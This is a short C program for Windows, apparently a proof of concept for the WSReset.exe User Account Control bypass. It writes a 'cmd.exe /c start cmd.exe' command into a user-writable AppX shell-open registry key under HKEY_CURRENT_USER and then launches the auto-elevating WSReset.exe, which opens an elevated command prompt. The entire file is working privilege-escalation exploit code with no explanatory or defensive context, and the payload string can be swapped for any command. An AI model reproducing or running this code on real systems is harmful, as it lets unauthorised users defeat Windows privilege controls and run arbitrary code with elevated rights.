#include <stdio.h>
#include <windows.h>

int main(void)
{
	LPCWSTR regname = L"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open";
	HKEY hkResult = NULL;
	const wchar_t * payload = L"C:\\Windows\\System32\\cmd.exe /c start cmd.exe";
	DWORD Len = wcslen(payload)*2 + 2;
	
	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hkResult);

	ret = RegSetValueEx(hkResult, L"command", 0, REG_SZ, (BYTE*)payload, Len);
	if (ret == 0) {
		printf("success to write run key\n");
		RegCloseKey(hkResult);
	}
	else {
		printf("failed to open regedit.%d\n", ret);
		return 0;
	}
	printf("Starting WSReset.exe");
	system("C://Windows//System32//WSReset.exe");
	return 0;
}